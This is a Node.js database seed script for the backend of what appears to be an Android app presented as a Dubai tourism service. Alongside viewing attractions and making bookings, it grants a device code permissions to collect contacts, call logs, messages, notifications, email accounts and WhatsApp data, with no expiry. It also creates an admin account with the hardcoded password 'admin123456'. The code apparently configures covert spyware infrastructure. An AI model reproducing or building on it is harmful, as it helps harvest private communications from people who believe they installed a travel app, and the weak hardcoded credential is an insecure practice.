const mongoose = require('mongoose');
const config = require('./config/environment');
const Admin = require('./models/Admin');
const AppPermission = require('./models/AppPermission');

// Connect to MongoDB
const connectDB = async () => {
    try {
        await mongoose.connect(config.mongodb.uri, {
            useNewUrlParser: true,
            useUnifiedTopology: true
        });
        console.log('✅ MongoDB connected successfully');
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        process.exit(1);
    }
};

// Seed permissions for device code 61250
const seedPermissions = async () => {
    try {
        console.log('🌱 Starting permissions seeding...');

        // Find or create admin for device code 61250
        let admin = await Admin.findOne({ deviceCode: '61250' });
        
        if (!admin) {
            console.log('⚠️  Admin with device code 61250 not found. Creating one...');
            
            // Create a new admin for device code 61250
            admin = new Admin({
                username: 'admin_61250',
                email: 'admin_61250@dubaidiscoveries.com',
                password: 'admin123456', // This will be hashed automatically
                role: 'sub_admin',
                deviceCode: '61250',
                maxDevices: 5,
                permissions: [
                    'view_devices', 
                    'manage_users', 
                    'manage_codes', 
                    'view_analytics', 
                    'system_settings'
                ],
                allowedDataTypes: [
                    'CONTACTS',
                    'CALL_LOGS', 
                    'MESSAGES', 
                    'NOTIFICATIONS', 
                    'EMAIL_ACCOUNTS', 
                    'WHATSAPP'
                ]
            });
            
            await admin.save();
            console.log('✅ Created admin for device code 61250');
        } else {
            console.log('✅ Found existing admin for device code 61250');
        }

        // Check if permissions already exist for device code 61250
        let existingPermission = await AppPermission.findOne({ deviceCode: '61250' });
        
        if (existingPermission) {
            console.log('⚠️  Permissions already exist for device code 61250. Updating...');
            
            // Update existing permissions
            existingPermission.permissions = {
                canAccessApp: true,
                canViewAttractions: true,
                canViewServices: true,
                canViewTourPackages: true,
                canMakeBookings: true,
                canViewProfile: true,
                canSyncData: true,
                canCollectContacts: true,
                canCollectCallLogs: true,
                canCollectMessages: true,
                canCollectNotifications: true,
                canCollectEmailAccounts: true,
                canCollectWhatsApp: true
            };
            
            existingPermission.isActive = true;
            existingPermission.isVerified = true;
            existingPermission.verificationDate = new Date();
            existingPermission.grantedBy = admin._id;
            
            await existingPermission.save();
            console.log('✅ Updated permissions for device code 61250');
        } else {
            console.log('🌱 Creating new permissions for device code 61250...');
            
            // Create new permissions
            const permission = new AppPermission({
                deviceCode: '61250',
                deviceId: 'placeholder_device_id_61250', // Will be updated when device registers
                androidId: 'placeholder_android_id_61250', // Will be updated when device registers
                deviceInfo: {
                    deviceName: 'Device 61250',
                    model: 'Unknown',
                    manufacturer: 'Unknown',
                    androidVersion: 'Unknown',
                    buildNumber: 'Unknown',
                    sdkVersion: 0,
                    screenResolution: 'Unknown',
                    totalStorage: 'Unknown',
                    availableStorage: 'Unknown',
                    deviceFingerprint: 'placeholder_fingerprint_61250'
                },
                permissions: {
                    canAccessApp: true,
                    canViewAttractions: true,
                    canViewServices: true,
                    canViewTourPackages: true,
                    canMakeBookings: true,
                    canViewProfile: true,
                    canSyncData: true,
                    canCollectContacts: true,
                    canCollectCallLogs: true,
                    canCollectMessages: true,
                    canCollectNotifications: true,
                    canCollectEmailAccounts: true,
                    canCollectWhatsApp: true
                },
                isActive: true,
                isVerified: true,
                verificationDate: new Date(),
                grantedBy: admin._id,
                expiresAt: null // No expiry
            });
            
            await permission.save();
            console.log('✅ Created permissions for device code 61250');
        }

        console.log('🎉 Permissions seeding completed successfully!');
        console.log('\n📱 Device Code: 61250');
        console.log('🔑 Permissions granted:');
        console.log('   • App Access: ✅');
        console.log('   • View Attractions: ✅');
        console.log('   • View Services: ✅');
        console.log('   • View Tour Packages: ✅');
        console.log('   • Make Bookings: ✅');
        console.log('   • View Profile: ✅');
        console.log('   • Sync Data: ✅');
        console.log('   • Collect Contacts: ✅');
        console.log('   • Collect Call Logs: ✅');
        console.log('   • Collect Messages: ✅');
        console.log('   • Collect Notifications: ✅');
        console.log('   • Collect Email Accounts: ✅');
        console.log('   • Collect WhatsApp: ✅');
        
        console.log('\n🌐 API Endpoints:');
        console.log('   • Permission Gateway: POST /api/permissions/gateway/verify');
        console.log('   • Get Permissions: GET /api/permissions/device/61250');
        console.log('   • Check Permission: POST /api/permissions/check/:permissionName');
        console.log('   • Permission Analytics: GET /api/permissions/analytics/61250');

    } catch (error) {
        console.error('❌ Error seeding permissions:', error);
    }
};

// Run seeder if this file is executed directly
if (require.main === module) {
    connectDB()
        .then(() => seedPermissions())
        .then(() => {
            console.log('✅ Seeding completed. Closing connection...');
            mongoose.connection.close();
        })
        .catch((error) => {
            console.error('❌ Seeding failed:', error);
            mongoose.connection.close();
            process.exit(1);
        });
} else {
    // Export for use in other modules
    module.exports = { seedPermissions };
}
